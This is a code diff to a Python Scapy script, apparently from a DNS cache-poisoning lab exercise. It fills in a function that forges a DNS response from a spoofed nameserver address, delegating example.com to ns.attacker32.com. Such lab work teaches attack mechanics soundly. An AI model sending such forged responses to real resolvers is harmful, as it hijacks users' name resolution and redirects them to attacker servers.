@@ -19,7 +19,7 @@ def reply():
     dns = DNS(id=0xAAA, aa=1, rd=1, qr=1,
               qdcount=1, ancount=1, nscount=1, arcount=0,
               qd=DNSQR(qname=name),
-              an=DNSRR(rrname='www.' + name, type='A', rdata='1.2.3.4', ttl=259200),
+              an=DNSRR(rrname='www.' + domain, type='A', rdata='1.2.3.4', ttl=259200),
               ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
     return ip/udp/dns
 
@@ -33,7 +33,15 @@ def log(type='q'):
         return ip/udp/dns
 
     def reply():
-        pass
+        domain = 'example.com'
+        ip = IP(dst='10.9.0.53', src='199.43.133.53', chksum=0)
+        udp = UDP(dport=33333, sport=53, chksum=0)
+        dns = DNS(id=0xAAAA, aa=1, ra=0, rd=1, cd=0, qr=1,
+                  qdcount=1, ancount=1, nscount=1, arcount=0,
+                  qd=DNSQR(qname='twysw.' + domain),
+                  an=DNSRR(rrname='twysw.' + domain, type='A', rdata='1.2.3.4', ttl=259200),
+                  ns=DNSRR(rrname=domain, type='NS', rdata='ns.attacker32.com', ttl=259200))
+        return ip/udp/dns
 
     filename, packet = ('ip_req.bin', query()) if type == 'q' else\
                        ('ip_resp.bin', reply())
